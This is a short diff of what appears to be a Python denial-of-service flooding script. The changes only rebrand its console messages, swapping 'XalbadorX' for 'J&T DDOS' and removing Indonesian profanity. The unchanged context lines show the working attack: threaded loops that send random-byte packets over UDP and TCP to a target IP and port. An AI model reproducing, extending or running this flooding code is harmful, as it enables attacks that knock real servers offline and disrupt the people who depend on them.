@@ -25,9 +25,9 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" | XalbadorX |")
+			print(i +" | J&T DDOS|")
 		except:
-			print("[!] | Server down kontol!!! |")
+			print("[!] | TOK TOK PAKET!!! |")
 
 def run2():
 	data = random._urandom(16)
@@ -39,10 +39,10 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" Xalbador nih bos!!!")
+			print(i +" J&T DDOS nih bos!!!")
 		except:
 			s.close()
-			print("[*] Down lagi kontol")
+			print("[*] PAKETTT DATANG LAGI ")
 
 for y in range(threads):
 	if choice == 'y':
